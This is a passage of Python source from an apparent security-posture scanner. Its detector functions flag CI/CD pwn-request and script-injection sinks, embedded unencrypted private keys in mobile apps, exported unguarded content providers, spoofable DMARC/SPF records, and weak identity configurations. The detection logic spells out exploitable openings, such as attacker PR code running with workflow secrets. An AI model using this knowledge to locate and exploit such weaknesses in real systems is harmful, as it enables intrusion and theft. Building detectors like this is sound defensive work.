            return _cicd_signal(False, evidence=f"{uses!r} is a first-party/local action (not a supply-chain risk)",
                                observed={"rule": rule, "uses": uses, "owner": owner})
        if _SHA40_RE.match(ref):
            return _cicd_signal(False, evidence=f"{uses!r} is SHA-pinned (immutable)",
                                observed={"rule": rule, "uses": uses, "ref": ref})
        return _cicd_signal(True, conf=0.85,
                            evidence=(f"{loc}: third-party action {owner}/{repo} is pinned to the MUTABLE ref "
                                      f"{ref!r} (not a commit SHA) — a supply-chain risk (the action can change under you)"),
                            observed={"rule": rule, "uses": uses, "owner": owner, "repo": repo, "ref": ref})

    if rule == "pwn_request":
        trigger = _coerce_text(ctl.get("trigger")).strip().lower()
        checkout = _coerce_text(ctl.get("checkout_ref"))[:_CICD_VALUE_CAP]
        if trigger != "pull_request_target":
            return _cicd_signal(False, evidence=f"trigger {trigger!r} is not pull_request_target",
                                observed={"rule": rule, "trigger": trigger})
        if not _UNTRUSTED_PR_CHECKOUT_RE.search(checkout):
            return _cicd_signal(False, evidence="pull_request_target does not check out the untrusted PR head",
                                observed={"rule": rule, "trigger": trigger, "checkout_ref": checkout.strip()})
        return _cicd_signal(True, conf=0.9,
                            evidence=(f"{loc}: pull_request_target checks out the UNTRUSTED PR head "
                                      f"({checkout.strip()!r}) — a pwn-request (attacker PR code runs with the "
                                      f"workflow's write-scoped token/secrets)"),
                            observed={"rule": rule, "trigger": trigger, "checkout_ref": checkout.strip()})

    if rule == "script_injection":
        run = _coerce_text(ctl.get("run"))[:_CICD_VALUE_CAP]
        for m in _INTERP_RE.finditer(run):
            expr = m.group(1)
            body = _QUOTED_LIT_RE.sub(" ", expr)   # a quoted literal never dereferences a context
            for rx in _UNTRUSTED_CTX_RES:
                hit = rx.search(body)
                if hit is not None:
                    return _cicd_signal(True, conf=0.9,
                        evidence=(f"{loc}: a `run:` step interpolates the UNTRUSTED expression "
                                  + "${{ " + expr.strip() + " }} into the shell — a script-injection sink"),
                        observed={"rule": rule, "expression": expr.strip(), "match": hit.group(0)})
        return _cicd_signal(False, evidence="no untrusted ${{ github.event.* }} interpolation in the run body",
                            observed={"rule": rule})

    return _cicd_signal(False, evidence=f"unrecognised CI/CD rule {rule!r} (stays a lead)",
                        observed={"rule": rule})


def _mobile_signal(fired: bool, *, evidence: str, observed: dict, conf: float = 0.9) -> OracleSignal:
    return OracleSignal(kind=OracleKind.MOBILE_POSTURE, fired=fired, confidence=(conf if fired else 0.0),
                        evidence=evidence, observed=observed)


def mobile_posture_oracle(observed_control: Any) -> OracleSignal:
    """Promote a retained MobSF mobile-posture control to a FACT ONLY when the weakness is offline-
    RE-DERIVABLE from the control's literal evidence — never trusting the scanner's label. This slice
    proves ONE rule: ``private_key_material`` — an embedded PEM private-key block is a FACT iff the
    retained ``pem`` string LOADS as an UNENCRYPTED, structurally-valid private key (re-executed via
    ``cryptography``). An encrypted key (needs a passphrase we cannot prove), a public key, a certificate,
    a masked/partial blob, or an unparseable string do NOT fire — the oracle REFUSES rather than assert a
    weakness it cannot reconstruct. Pure, offline, deterministic; never raises."""
    if not isinstance(observed_control, Mapping):
        return _mobile_signal(False, evidence="no mobile control evidence", observed={})
    rule = _coerce_text(observed_control.get("rule")).strip().lower()

    if rule == "private_key_material":
        pem = _coerce_text(observed_control.get("pem"))
        if "PRIVATE KEY-----" not in pem:
            return _mobile_signal(False, evidence="no PEM private-key block in the retained evidence",
                                  observed={"rule": rule})
        try:
            from cryptography.hazmat.primitives.serialization import (  # noqa: PLC0415
                load_pem_private_key,
            )
        except Exception:
            # the crypto lib is absent → we cannot RE-DERIVE, so we REFUSE (never assert on trust).
            return _mobile_signal(False, evidence="cannot re-derive: cryptography unavailable",
                                  observed={"rule": rule})
        try:  # the OpenSSH container (ssh-keygen's default since 7.8) needs a distinct loader
            from cryptography.hazmat.primitives.serialization import (  # noqa: PLC0415
                load_ssh_private_key,
            )
        except Exception:  # very old cryptography — the PKCS1/8/SEC1 path below still works
            load_ssh_private_key = None
        data = pem.encode("utf-8", "replace")
        loaders = [load_pem_private_key] + ([load_ssh_private_key] if load_ssh_private_key else [])
        key = None
        for loader in loaders:
            try:
                key = loader(data, password=None)
                break
            except TypeError:
                # an ENCRYPTED private key (needs a passphrase we do not have) — real key material, but
                # its usability is unproven, so it stays a LEAD, not a fact.
                return _mobile_signal(False, evidence="an encrypted private key (passphrase-protected) — a lead, not a proven-usable key",
                                      observed={"rule": rule, "encrypted": True})
            except Exception:
                # this container did not parse it — try the next loader (PEM vs OpenSSH), else REFUSE.
                continue
        if key is None:
            # not a loadable key in any container (a public key, a cert, a masked/partial blob, garbage).
            return _mobile_signal(False, evidence="the PEM block does not load as a private key",
                                  observed={"rule": rule})
        key_kind = type(key).__name__
        return _mobile_signal(True, conf=0.95,
                              evidence=("an UNENCRYPTED, structurally-valid private key "
                                        f"({key_kind}) is embedded in the distributed client — extractable "
                                        "by anyone with the APK; not a secret"),
                              observed={"rule": rule, "key_type": key_kind})

    if rule == "exported_content_provider":
        # SOUND only on an EXPLICIT android:exported="true" with ZERO permission guards. We deliberately
        # REFUSE the default-export gating chain (a provider's export default depends on min/targetSdk —
        # a semantic layer the manifest fragment may not resolve): an absent/other `exported` is a LEAD,
        # never asserted. A provider carrying ANY of android:permission / readPermission / writePermission
        # / a <path-permission> child is guarded → NO fire (conservative: a set permission of any level
        # means the claim "unguarded" would be false).
        exported = _coerce_text(observed_control.get("exported")).strip().lower()
        if exported != "true":
            return _mobile_signal(False, observed={"rule": rule, "exported": exported},
                                  evidence="content provider is not EXPLICITLY exported=true (default-export unresolved — a lead)")
        guarded = any(_coerce_text(observed_control.get(k)).strip()
                      for k in ("permission", "read_permission", "write_permission"))
        if guarded or bool(observed_control.get("has_path_permission")):
            return _mobile_signal(False, observed={"rule": rule},
                                  evidence="the exported content provider carries a permission guard (not unguarded)")
        name = _coerce_text(observed_control.get("name")).strip()
        return _mobile_signal(True, conf=0.9,
                              evidence=(f"content provider{(' ' + name) if name else ''} is EXPORTED with no "
                                        "permission/readPermission/writePermission/path-permission guard — any "
                                        "installed app can read/write its content:// data"),
                              observed={"rule": rule, "name": name})

    return _mobile_signal(False, evidence=f"unrecognised/lead-only mobile rule {rule!r} (stays a lead)",
                          observed={"rule": rule})


# ---------------------------------------------------------------------------
# Email-authentication posture (FORGE Domain 10) — a published policy that permits spoofing
# ---------------------------------------------------------------------------

# A DMARC policy that instructs receivers NOT to reject/quarantine spoofed mail. `p=none` is monitor-only:
# the domain publishes DMARC but explicitly asks receivers to take NO action, so spoofed mail is delivered.
# The `(?:^|;)\s*` boundary is load-bearing: it must never match the `sp=` (subdomain) or `np=` tags.
_DMARC_P_RE = re.compile(r"(?i)(?:^|;)\s*p\s*=\s*(none|quarantine|reject)\s*(?:;|$)")
# RFC 7489 §6.3: `sp=` overrides `p=` FOR SUBDOMAINS when present.
_DMARC_SP_RE = re.compile(r"(?i)(?:^|;)\s*sp\s*=\s*(none|quarantine|reject)\s*(?:;|$)")
# A PRESENCE probe for the `sp=` tag, independent of whether its VALUE parses. Load-bearing: "the value
# regex did not match" must never be read as "there is no sp= tag" — a failed parse is not proof of absence
# (the same error class as assuming a missing record means no policy). If sp= is present but unparseable we
# REFUSE rather than fall through to `p=` and read the WRONG tag.
_DMARC_SP_PRESENT_RE = re.compile(r"(?i)(?:^|;)\s*sp\s*=")
# One DNS TXT character-string in PRESENTATION form.
_TXT_STRING_RE = re.compile(r'"((?:[^"\\]|\\.)*)"')


def _decode_txt_escapes(s: str) -> str:
    """RFC 1035 §5.1: ONE captured character-string's PRESENTATION bytes -> the octets it actually encodes.

    ``\\DDD`` (a backslash + exactly three decimal digits, value 0-255) is the octet with that decimal value;
    ``\\c`` (a backslash + any other single char) is the literal ``c`` with the backslash dropped. This is
    LOAD-BEARING and must run BEFORE any tag regex: a spec-legal separator octet <0x20 (RFC 7489 §6.4
    ``dmarc-sep = *WSP %x3b *WSP``, WSP∋HTAB) is rendered by real ``dig +short``/BIND as the escape
    ``\\009`` — a literal backslash that breaks a tag's ``(?:^|;)\\s*`` anchor and would HIDE a protective
    ``sp=`` behind a visible ``p=none``. Decoding to wire bytes makes the TAB a real separator again.
    Faithful by construction: it only ever yields exactly what the publisher encoded, so it can never
    fabricate a protective tag the record does not carry (it removes FP risk, never adds it). Pure + total;
    a malformed trailing backslash is preserved verbatim, never raises."""
    if "\\" not in s:
        return s
    out: list[str] = []
    i, n = 0, len(s)
    while i < n:
        c = s[i]
        if c != "\\":
            out.append(c)
            i += 1
            continue
        # a backslash: \DDD (three decimal digits, an octet 0-255) else \c (literal next char)
        if i + 4 <= n and s[i + 1:i + 4].isdigit() and int(s[i + 1:i + 4]) <= 255:
            out.append(chr(int(s[i + 1:i + 4])))
            i += 4
        elif i + 1 < n:
            out.append(s[i + 1])                 # \c -> literal c (covers \" \\ \; and malformed \9)
            i += 2
        else:
            out.append(c)                        # a lone trailing backslash: preserve, do not raise
            i += 1
    return "".join(out)
# A zone-file RR header (`_dmarc.gov.example. 3600 IN TXT`) — the ONLY unquoted content permitted to
# precede a record's character-strings.
# The owner name excludes `=` so a tag-value string can never be mistaken for an RR header and swallowed
# as scaffolding; the TTL accepts BIND's unit suffixes (`1h`, `1D`, `1h30m`) as well as bare seconds.
_ZONE_RR_HEADER_RE = re.compile(r"(?i)^[^\s\"=]+(?:\s+(?:(?:\d+[smhdw]?)+|IN|CH|CS|HS))*\s+TXT$")
# RFC 7489 §6.6.3 / RFC 7208 §4.5 record SELECTION: a record that does not begin with the version tag is
# not a policy record at all and is discarded by receivers. Deliberately UNANCHORED: `.match()` anchors at
# position 0 for the selection test, while the same pattern counts version tags across a whole record to
# detect a spliced one. The DMARC/SPF asymmetry is the RFCs' own — RFC 7489's ABNF is `"v" *WSP "=" *WSP`
# (whitespace legal), RFC 7208's is the literal `"v=spf1"` (it is not).
_DMARC_VERSION_RE = re.compile(r"(?i)v\s*=\s*DMARC1\s*(?:;|$)")
_SPF_VERSION_RE = re.compile(r"(?i)v=spf1(?:\s|$)")


def _resolve_txt_record(line: str) -> str | None:
    """ONE record's presentation form -> the character-string it encodes; ``None`` if it does not
    unambiguously encode one.

    RFC 1035 §3.3.14 concatenates ADJACENT character-strings *within a single record*, and §5.1 escape
    sequences inside each string are decoded to wire octets FIRST (`_decode_txt_escapes`). Anything else
    outside the strings is content this cannot faithfully resolve — and silently DISCARDING it is how a
    protective tag disappears (`'"v=DMARC1; p=none;" sp=reject'` -> a `sp=reject` that never reaches the
    parser). Unquoted content mixed among character-strings is REFUSED, never dropped."""
    if '"' not in line:
        bare = line.strip()
        # A BARE (unquoted) record is the operator's already-decoded wire octets — and the wire form of a
        # valid DMARC/SPF record never contains a backslash. So a backslash here is UNRESOLVABLE: it is
        # either an undecoded RFC 1035 §5.1 presentation escape (a quote-stripping export left `\009` for a
        # separator octet, which would HIDE a protective tag behind the literal backslash) or malformed
        # content. We cannot tell which without guessing, and guessing is the fault line — so REFUSE. (The
        # QUOTED branch below decodes, because there a backslash is unambiguously a §5.1 escape.)
        return None if "\\" in bare else bare
    spans = list(_TXT_STRING_RE.finditer(line))
    if not spans:
        return None                             # a quote opens a string that never closes
    head = line[: spans[0].start()].strip()
    if head and not _ZONE_RR_HEADER_RE.match(head):
        return None                             # unquoted content ahead of the record
    prev = spans[0].end()
    for span in spans[1:]:
        if line[prev : span.start()].strip():
            return None                         # unquoted content BETWEEN character-strings
        prev = span.end()
    if line[prev:].strip():
        return None                             # unquoted content trailing the record
    # §5.1 decode each string to wire octets, THEN §3.3.14 concatenate — so every tag regex reads wire bytes
    return "".join(_decode_txt_escapes(span.group(1)) for span in spans).strip()


def _txt_records(raw: Any) -> list[str] | None:
    """A retained DNS TXT blob -> the list of RECORDS it encodes; ``None`` if it cannot be resolved.

    Load-bearing: concatenation is defined WITHIN one record — separate records are NEVER joined, and
    ``dig +short`` prints one record per line. Joining across record boundaries both FABRICATES policy
    (two DMARC records -> one spliced record asserting a `p=` no record published, its verdict decided by
    RRset return order) and DESTROYS it. Records are split here on newlines outside quotes and outside
    zone-file `( )` continuation; an unbalanced quote or paren is unresolvable input, not a record."""
    s = _coerce_text(raw)
    if not s.strip():
        return []
    lines: list[str] = []
    buf: list[str] = []
    in_quote = False
    depth = 0
    i = 0
    while i < len(s):
        c = s[i]
        if in_quote:
            if c == "\\" and i + 1 < len(s):     # an escaped char never closes the string
                buf.append(c)
                buf.append(s[i + 1])
                i += 2
                continue
            if c == '"':
                in_quote = False
            buf.append(c)
        elif c == '"':
            in_quote = True
            buf.append(c)
        elif c == "(" or c == ")":               # zone-file grouping: a newline inside is NOT a boundary
            depth += 1 if c == "(" else -1
            if depth < 0:
                return None
            buf.append(" ")
        elif c in "\r\n" and depth == 0:         # CR, LF or CRLF: an empty chunk between them is dropped below
            lines.append("".join(buf))
            buf = []
        else:
            buf.append(" " if c in "\r\n" else c)
        i += 1
    if in_quote or depth != 0:
        return None
    lines.append("".join(buf))
    out: list[str] = []
    for line in lines:
        if not line.strip():
            continue
        record = _resolve_txt_record(line)
        if record is None:
            return None
        # An EMPTY record (`""`) is retained, not dropped: a record that exists but carries no policy is
        # not the same thing as a producer that retained nothing, and only the latter may be read as
        # absence. Dropping it here would make `_select_txt` report absence and mint evidence reading
        # "no DMARC record is published" about a domain that published one.
        out.append(record)
    return out


def _select_txt(raw: Any, version: "re.Pattern[str]") -> str | None:
    """The ONE policy record a receiver would act on; ``""`` only when the producer retained NOTHING;
    ``None`` when the blob is unresolvable, carries no policy record, or carries more than one.

    A real apex TXT set is normally MULTI-record (SPF alongside site-verification tokens), so selecting the
    version-tagged record — RFC 7489 §6.6.3 / RFC 7208 §4.5 — is what makes a real export readable at all.
    Duplicate policy records are refused rather than resolved: both RFCs make a duplicate set apply NO
    policy, and picking one of them would be asserting from an ambiguity.

    Load-bearing, and the reason absence is read from the EMPTY blob and not from a failed selection: "no
    record here matched the version tag" is NOT proof that the domain publishes no policy — it is equally
    what a record this cannot canonicalise looks like (a presentation form outside RFC 1035's grammar, say),
    and reading that as absence would fire `dmarc_missing` at a domain whose record is right there in the
    evidence. Absence is only ever asserted from a producer that retained NOTHING and attested it OBSERVED
    the lookup; a non-empty blob that yields no policy record is unresolved input, so REFUSE."""
    records = _txt_records(raw)
    if records is None:
        return None
    if not records:
        return ""                               # the producer retained nothing — absence, gated on *_observed
    hits = [r for r in records if version.match(r)]
    if len(hits) != 1:
        return None
    if len(version.findall(hits[0])) != 1:
        # TWO version tags inside ONE record: RFC 1035 §3.3.14 faithfully concatenated adjacent strings a
        # publisher meant as separate records, yielding a syntactically invalid policy string. Reading a
        # tag out of it names a policy that is not in effect — refuse rather than pick.
        return None
    return hits[0]
# SPF's `all` mechanism qualifier: `-all` fail (good), `~all` softfail, `?all` neutral, `+all`/`all` PASS-ALL
# (any host on the internet passes SPF for this domain — an unconditionally broken policy).
_SPF_ALL_RE = re.compile(r"(?i)(?:^|\s)([-~?+]?)all(?:\s|$)")


def _email_signal(fired: bool, *, evidence: str, observed: dict, conf: float = 0.9) -> OracleSignal:
    return OracleSignal(kind=OracleKind.EMAIL_AUTH_POSTURE, fired=fired,
                        confidence=(conf if fired else 0.0), evidence=evidence, observed=observed)


def email_auth_posture_oracle(observed_control: Any) -> OracleSignal:
    """Fire when a domain's RETAINED, PUBLISHED email-authentication policy provably permits spoofing — a
    pure re-derivation over the DNS TXT records themselves, never a receiving MTA's ``Authentication-Results``
    say-so (that would be string trust). Three rules, each unconditional and re-verifiable offline:

      * ``dmarc_missing``  — the domain publishes NO DMARC record: receivers are given no policy, so
        header-From spoofing is unmitigated (SPF alone does not protect the header-From a user sees).
      * ``dmarc_none``     — DMARC ``p=none``: the domain explicitly instructs receivers to take NO action.
      * ``spf_permissive`` — SPF ends in ``+all``/``all``: ANY host on the internet passes SPF for the domain.

    A hardened domain (``p=reject``/``p=quarantine``, SPF ``-all``) does NOT fire. DELIBERATELY out of scope
    (REFUSE, never assert): message-level SPF/DKIM/DMARC verification — DKIM canonicalisation and SPF
    include/macro chains are a semantic layer this cannot soundly re-derive offline; and ``spf_missing`` alone
    (DKIM+DMARC may still protect the domain — a gating chain). Pure + deterministic; never raises."""
    if not isinstance(observed_control, Mapping):
        return _email_signal(False, evidence="no email-auth control evidence", observed={})
    rule = _coerce_text(observed_control.get("rule")).strip().lower()
    domain = _coerce_text(observed_control.get("domain")).strip()
    where = f" for {domain}" if domain else ""

    if rule == "dmarc_missing":
        rec = _select_txt(observed_control.get("dmarc_record"), _DMARC_VERSION_RE)
        org_rec = _select_txt(observed_control.get("org_dmarc_record"), _DMARC_VERSION_RE)
        if rec is None or org_rec is None:
            # The blob does not resolve to one policy record (duplicate records, or unquoted content mixed
            # among character-strings). Reading a spliced or truncated record would assert a policy NO
            # record published: absence is UNRESOLVED here, so refuse.
            return _email_signal(False, observed={"rule": rule},
                                 evidence=("a retained DMARC record set does not resolve to a single policy "
                                           "record — the published policy is UNRESOLVED (REFUSE)"))
        # only assert absence when the producer OBSERVED the lookup and recorded no record (never assume)
        if rec:
            return _email_signal(False, observed={"rule": rule},
                                 evidence="a DMARC record is present — not missing")
        if observed_control.get("dmarc_observed") is not True:
            return _email_signal(False, observed={"rule": rule},
                                 evidence="DMARC lookup not observed — absence unproven (REFUSE)")
        # self-contradictory evidence (attested an org domain AND handed an org-domain policy to inherit)
        # is refused rather than resolved down whichever branch happens to fire.
        if observed_control.get("is_org_domain") is True and (
                org_rec or observed_control.get("org_dmarc_observed") is True):
            return _email_signal(False, observed={"rule": rule},
                                 evidence=("contradictory evidence: attested an ORGANIZATIONAL domain yet "
                                           "carries an organizational-domain policy to inherit (REFUSE)"))
        # RFC 7489 §6.6.3: an ABSENT record at the From-domain does NOT mean "no policy" — receivers then
        # query the ORGANIZATIONAL domain, and §6.3 applies its `sp=` (else `p=`) to the subdomain. So a
        # subdomain that correctly publishes nothing is FULLY protected by an org `p=reject`. Absence alone
        # therefore proves NOTHING; the EFFECTIVE policy must be resolved from the RETAINED evidence, or we
        # REFUSE (the same discipline that already refuses `spf_missing` as a gating chain).
        if observed_control.get("is_org_domain") is True:
            return _email_signal(True, conf=0.9,
                                 evidence=(f"no DMARC record is published for the ORGANIZATIONAL domain"
                                           f"{where or ' (unnamed)'} — there is no parent policy to inherit, "
                                           "so receivers are given no policy for it or its subdomains"),
                                 observed={"rule": rule, "domain": domain, "scope": "organizational"})
        if observed_control.get("org_dmarc_observed") is not True:
            return _email_signal(False, observed={"rule": rule, "domain": domain},
                                 evidence=("no DMARC here, but this is not attested an organizational domain "
                                           "and the organizational-domain lookup was not observed — the RFC 7489 "
                                           "§6.6.3 inheritance chain is UNRESOLVED (REFUSE)"))
        org = _coerce_text(observed_control.get("org_domain")).strip()
        if not org:
            # a fired certificate must NAME the domain whose policy was looked up, or a third party
            # re-running it cannot audit the inheritance claim.
            return _email_signal(False, observed={"rule": rule, "domain": domain},
                                 evidence=("the organizational domain is not named — the inheritance claim "
                                           "would not be auditable from the certificate (REFUSE)"))
        if not org_rec:
            return _email_signal(True, conf=0.9,
                                 evidence=(f"neither{where} nor its organizational domain {org} publishes "
                                           "DMARC — no policy exists anywhere in the chain to inherit"),
                                 observed={"rule": rule, "domain": domain, "org_domain": org})
        # §6.3: the subdomain inherits `sp=` when present, else the org domain's `p=`.
        m = _DMARC_SP_RE.search(org_rec)
        if m is None and _DMARC_SP_PRESENT_RE.search(org_rec):
            # An `sp=` tag IS present but its value did not parse. Falling through to `p=` would read the
            # WRONG tag and assert the negative from a failed parse — the same error class as assuming
            # absence. The SUBDOMAIN policy is unresolved: REFUSE.
            return _email_signal(False, observed={"rule": rule, "org_domain": org},
                                 evidence=("the organizational record carries an sp= tag whose value did not "
                                           "parse — the subdomain policy is UNRESOLVED (REFUSE)"))
        if m is None:
            m = _DMARC_P_RE.search(org_rec)
        if m is None:
            return _email_signal(False, observed={"rule": rule},
                                 evidence="the organizational DMARC record has no parseable policy (REFUSE)")
        eff = m.group(1).lower()
        if eff != "none":
            return _email_signal(False, observed={"rule": rule, "inherited_policy": eff},
                                 evidence=(f"publishes no DMARC of its own but INHERITS the organizational "
                                           f"domain's effective subdomain policy p={eff} — protected"))
        return _email_signal(True, conf=0.9,
                             evidence=(f"no DMARC is published{where} and the organizational domain"
                                       f"{(' ' + org) if org else ''} resolves to an effective subdomain "
                                       "policy of none — receivers are told to take no action"),
                             observed={"rule": rule, "domain": domain, "org_domain": org,
                                       "inherited_policy": eff})

    if rule == "dmarc_none":
        rec = _select_txt(observed_control.get("dmarc_record"), _DMARC_VERSION_RE)
        if rec is None:
            return _email_signal(False, observed={"rule": rule},
                                 evidence=("the retained DMARC record set does not resolve to a single "
                                           "policy record — the published policy is UNRESOLVED (REFUSE)"))
        m = _DMARC_P_RE.search(rec)
        if m is None:
            return _email_signal(False, observed={"rule": rule},
                                 evidence="no parseable DMARC policy (p=) in the retained record (REFUSE)")
        policy = m.group(1).lower()
        if policy != "none":
            return _email_signal(False, observed={"rule": rule, "policy": policy},
                                 evidence=f"DMARC policy is p={policy} — receivers are told to act")
        return _email_signal(True, conf=0.9,
                             evidence=(f"DMARC policy{where} is p=none — the domain explicitly instructs "
                                       "receivers to take NO action on spoofed mail (monitoring only)"),
                             observed={"rule": rule, "domain": domain, "policy": policy})

    if rule == "spf_permissive":
        rec = _select_txt(observed_control.get("spf_record"), _SPF_VERSION_RE)
        if rec is None:
            return _email_signal(False, observed={"rule": rule},
                                 evidence=("the retained SPF record set does not resolve to a single policy "
                                           "record — the sender policy is UNRESOLVED (REFUSE)"))
        if not rec:
            return _email_signal(False, observed={"rule": rule},
                                 evidence="no SPF record retained (REFUSE — absence is a gating chain)")
        m = _SPF_ALL_RE.search(rec)
        if m is None:
            return _email_signal(False, observed={"rule": rule},
                                 evidence="the SPF record has no `all` mechanism (REFUSE)")
        qual = m.group(1) or "+"          # a bare `all` means `+all` (SPF default qualifier is pass)
        if qual != "+":
            return _email_signal(False, observed={"rule": rule, "qualifier": qual},
                                 evidence=f"SPF ends in {qual}all — not a pass-all policy")
        return _email_signal(True, conf=0.9,
                             evidence=(f"SPF{where} ends in +all — ANY host on the internet passes SPF for "
                                       "this domain (an unconditionally permissive sender policy)"),
                             observed={"rule": rule, "domain": domain, "qualifier": qual})

    return _email_signal(False, evidence=f"unrecognised/lead-only email-auth rule {rule!r} (stays a lead)",
                         observed={"rule": rule})


# ---------------------------------------------------------------------------
# Identity posture (FORGE Domain 7, slice 1) — a published IdP config that provably weakens an identity
# ---------------------------------------------------------------------------


def _identity_signal(fired: bool, *, evidence: str, observed: dict, conf: float = 0.9) -> OracleSignal:
    return OracleSignal(kind=OracleKind.IDENTITY_POSTURE, fired=fired,
                        confidence=(conf if fired else 0.0), evidence=evidence, observed=observed)


def _as_nonneg_int(v: Any) -> "int | None":
    """A retained value as a non-negative int, else ``None``. STRICT: a bool is NOT an int here (``True``
    must never be read as age 1), and a numeric STRING is NOT coerced (a retained age/threshold must be a
    real integer the producer computed, not a parse of presentation text — the fault line that cost Domain
    10 eight defects). Only a genuine ``int >= 0`` qualifies."""
    if isinstance(v, bool):
        return None
    if isinstance(v, int) and v >= 0:
        return v
    return None


def _is_universal_grant(grant: str) -> bool:
    """A grant string that provably confers EVERYTHING-ON-EVERYTHING (FORGE Domain 7 slice 2). Universal iff
    every ``:``/``/``-separated segment is a bare ``*`` (a bare ``*``, ``*:*``, ``*/*``, ``*:*:*`` …). A
    scoped or PARTIAL wildcard — ``read:*`` (action scoped), ``*:invoices`` (resource scoped), ``*:`` (empty
    segment) — is NOT universal and must NOT fire: partial wildcards are common and legitimate, and firing on
    them is exactly where the false positives would live (the charter's near-zero-FP scoping)."""
    s = (grant or "").strip()
    if not s:
        return False
    parts = re.split(r"[:/]", s)
    return bool(parts) and all(p.strip() == "*" for p in parts)


def identity_posture_oracle(observed_control: Any) -> OracleSignal:
    """Fire when a RETAINED identity-provider export provably carries an identity-posture weakness — a pure
    re-derivation over STRICT-TYPED literal fields, never an IdP's or scanner's say-so. Two rules (FORGE
    Domain 7, slice 1), each unconditional and re-verifiable offline:

      * ``privileged_without_mfa`` — a producer-attested privileged identity with MFA PROVABLY absent:
        ``privileged is True`` AND ``mfa_enrolled is False``. An ABSENT/unknown ``mfa_enrolled`` REFUSES —
        a missing field is NOT proof MFA is absent (absence must be OBSERVED, never assumed).
      * ``stale_credential`` — ``never_rotated is True`` (a producer attestation that the credential is
        configured NEVER to expire/rotate — a permanent secret), OR two retained integers
        ``age_days >= max_age_days`` (the operator's rotation policy). A missing/non-integer age or
        threshold REFUSES.

    A compliant identity (``mfa_enrolled is True``; ``age_days < max_age_days``) does NOT fire. DELIBERATELY
    out of scope (REFUSE, never assert): anomaly/behavioral detection (probabilistic); cloud-resource IAM
    (POLICY_PATH/CLOUD_POSTURE own that); privilege INFERENCE — the ``privileged`` attestation is REQUIRED,
    never guessed from a role name. Pure + deterministic; never raises."""
    if not isinstance(observed_control, Mapping):
        return _identity_signal(False, evidence="no identity control evidence", observed={})
    rule = _coerce_text(observed_control.get("rule")).strip().lower()
    subject = _coerce_text(observed_control.get("subject")).strip()
    where = f" for {subject}" if subject else ""

    if rule == "privileged_without_mfa":
        # privilege is a PRODUCER ATTESTATION, never inferred; without it there is no privileged-account
        # weakness to assert.
        if observed_control.get("privileged") is not True:
            return _identity_signal(False, observed={"rule": rule},
                                    evidence=("identity is not attested privileged — no privileged-account "
                                              "weakness to assert (REFUSE)"))
        mfa = observed_control.get("mfa_enrolled")
        if mfa is True:
            return _identity_signal(False, observed={"rule": rule},
                                    evidence="MFA is enrolled — compliant")
        if mfa is not False:
            # a MISSING/unknown mfa flag is NOT proof MFA is absent (the failed-parse≠absence discipline).
            return _identity_signal(False, observed={"rule": rule},
                                    evidence="MFA status not observed — absence unproven (REFUSE)")
        return _identity_signal(True, conf=0.9,
                                evidence=(f"a privileged identity{where or ' (unnamed)'} has MFA provably "
                                          "disabled (mfa_enrolled=false) — a single stolen password fully "
                                          "compromises a privileged account"),
                                observed={"rule": rule, "subject": subject, "privileged": True,
                                          "mfa_enrolled": False})

    if rule == "stale_credential":
        if observed_control.get("never_rotated") is True:
            return _identity_signal(True, conf=0.9,
                                    evidence=(f"a credential{where or ' (unnamed)'} is attested configured "
                                              "never to expire/rotate — a permanent, non-expiring secret"),
                                    observed={"rule": rule, "subject": subject, "never_rotated": True})
        age = _as_nonneg_int(observed_control.get("age_days"))
        maxa = _as_nonneg_int(observed_control.get("max_age_days"))
        if age is None or maxa is None:
            return _identity_signal(False, observed={"rule": rule},
                                    evidence=("credential age or its rotation-policy threshold is missing or "
                                              "not an integer — staleness UNRESOLVED (REFUSE)"))
        if maxa < 1:
            # a rotation policy of 0 (or less) days is not a real policy — it is almost always a "no policy"
            # sentinel, against which EVERY credential (age >= 0) would fire. Refuse rather than assert.
            return _identity_signal(False, observed={"rule": rule},
                                    evidence=("the rotation-policy threshold is 0 days — not a real policy "
                                              "(a likely 'no policy' sentinel); staleness UNRESOLVED (REFUSE)"))
        if age < maxa:
            return _identity_signal(False, observed={"rule": rule, "age_days": age, "max_age_days": maxa},
                                    evidence=(f"credential age {age}d is within the {maxa}d rotation policy "
                                              "— compliant"))
        return _identity_signal(True, conf=0.9,
                                evidence=(f"a credential{where or ' (unnamed)'} is {age} days old, at or past "
                                          f"its {maxa}-day rotation policy — a stale long-lived secret"),
                                observed={"rule": rule, "subject": subject, "age_days": age,
                                          "max_age_days": maxa})

    if rule == "wildcard_grant":
        # an explicit unrestricted-admin attestation is the strongest form
        if observed_control.get("admin_all") is True:
            return _identity_signal(True, conf=0.9,
                                    evidence=(f"identity{where or ' (unnamed)'} is attested admin_all — "
                                              "unrestricted everything-on-everything access"),
                                    observed={"rule": rule, "subject": subject, "admin_all": True})
        # else a single retained grant that is provably UNIVERSAL (everything on everything). A scoped or
        # partial wildcard does NOT fire (near-zero-FP: only the universal grant is a weakness).
        grant = _coerce_text(observed_control.get("grant")).strip()
        if not grant:
            return _identity_signal(False, observed={"rule": rule},
                                    evidence="no admin_all attestation and no retained grant — nothing to assert (REFUSE)")
        if not _is_universal_grant(grant):
            return _identity_signal(False, observed={"rule": rule, "grant": grant},
                                    evidence=f"grant {grant!r} is scoped or partially-wildcarded — not universal, compliant")
        return _identity_signal(True, conf=0.9,
                                evidence=(f"identity{where or ' (unnamed)'} holds a UNIVERSAL wildcard grant "
                                          f"{grant!r} — everything-on-everything access"),
                                observed={"rule": rule, "subject": subject, "grant": grant})

    if rule == "dormant_privileged":
        if observed_control.get("privileged") is not True:
            return _identity_signal(False, observed={"rule": rule},
                                    evidence=("identity is not attested privileged — no privileged-account "
                                              "weakness to assert (REFUSE)"))
        days = _as_nonneg_int(observed_control.get("days_since_login"))
        thresh = _as_nonneg_int(observed_control.get("dormancy_threshold_days"))
        if days is None or thresh is None:
            return _identity_signal(False, observed={"rule": rule},
                                    evidence=("days-since-login or the dormancy threshold is missing or not an "
                                              "integer — dormancy UNRESOLVED (REFUSE)"))
        if thresh < 1:
            return _identity_signal(False, observed={"rule": rule},
                                    evidence=("the dormancy threshold is 0 days — not a real policy (a likely "
                                              "sentinel); dormancy UNRESOLVED (REFUSE)"))
        if days < thresh:
            return _identity_signal(False, observed={"rule": rule, "days_since_login": days,
                                                     "dormancy_threshold_days": thresh},
                                    evidence=f"last authenticated {days}d ago, within the {thresh}d dormancy policy — compliant")
        return _identity_signal(True, conf=0.9,
                                evidence=(f"a privileged identity{where or ' (unnamed)'} last authenticated "
                                          f"{days} days ago, at or past the {thresh}-day dormancy threshold — a "
                                          "stale privileged account an attacker can seize unnoticed"),
                                observed={"rule": rule, "subject": subject, "days_since_login": days,
